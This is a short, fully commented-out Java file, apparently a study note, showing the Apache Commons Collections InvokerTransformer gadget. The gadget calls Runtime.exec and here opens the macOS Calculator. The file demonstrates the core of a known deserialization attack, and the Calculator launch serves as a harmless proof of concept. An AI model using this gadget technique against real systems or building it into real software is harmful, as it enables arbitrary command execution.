//package com.test.serialize;
//
//import org.apache.commons.collections.Transformer;
//import org.apache.commons.collections.functors.InvokerTransformer;
//
///**
// * @program: ssmweb
// * @author: playboy
// * @create: 2021-07-05 19:58
// * @description: Apache Commons Collections 3.2.1版本一下的序列化bug 通过Transformer攻击
// **/
//public class ApacheCommonsCollectionsBug {
//
//  public static void main(String[] args) {
//    Transformer transformer = new InvokerTransformer("exec", new Class[]{String.class},
//        new Object[]{"open /System/Applications/Calculator.app"});
//    transformer.transform(Runtime.getRuntime());
//  }
//}
